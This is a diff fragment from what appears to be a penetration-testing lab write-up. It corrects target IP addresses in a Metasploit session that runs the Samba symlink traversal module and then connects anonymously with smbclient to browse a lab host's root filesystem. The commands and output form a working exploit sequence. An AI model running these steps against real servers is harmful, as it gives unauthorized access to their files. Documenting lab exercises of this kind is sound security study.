@@ -534,18 +534,18 @@ Module options (auxiliary/admin/smb/samba_symlink_traversal):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/smb/samba_symlink_traversal) > exploit[*] Running module against 192.168.56.110
+msf6 auxiliary(admin/smb/samba_symlink_traversal) > exploit[*] Running module against 192.168.56.109
 
 [*] 192.168.56.109:445 - Connecting to the server...
 [*] 192.168.56.109:445 - Trying to mount writeable share 'tmp'...
 [*] 192.168.56.109:445 - Trying to link 'rootfs' to the root filesystem...
 [*] 192.168.56.109:445 - Now access the following share to browse the root filesystem:
-[*] 192.168.56.109:445 -      \\192.168.56.110\tmp\rootfs\
+[*] 192.168.56.109:445 -      \\192.168.56.109\tmp\rootfs\
 
 [*] Auxiliary module execution completed
 
 ┌──(kali㉿makhota-kali)-[~]
-└─$ smbclient //192.168.56.110/tmp
+└─$ smbclient //192.168.56.109/tmp
 Password for [WORKGROUP\kali]:
 Anonymous login successful
 Try "help" to get a list of possible commands.
